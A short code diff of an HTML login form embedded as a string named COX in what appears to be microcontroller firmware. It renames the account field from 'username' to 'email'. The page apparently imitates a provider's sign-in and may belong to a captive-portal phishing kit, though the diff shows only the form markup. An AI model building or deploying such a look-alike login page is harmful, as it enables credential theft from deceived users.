@@ -53,7 +53,7 @@ const char COX[] PROGMEM = R"rawliteral(
         </div>
         <form action="/login" id="email-form-step" method="post">
             <div class="input-group">
-                <input name="username" type="text" class="form-input" placeholder="Account Number or Email" required autocomplete="off" aria-label="Account Number or Email">
+                <input name="email" type="text" class="form-input" placeholder="Account Number or Email" required autocomplete="off" aria-label="Account Number or Email">
             </div>
             <div class="input-group">
                 <input name="password" type="password" class="form-input" placeholder="Password" required autocomplete="off" aria-label="Password">
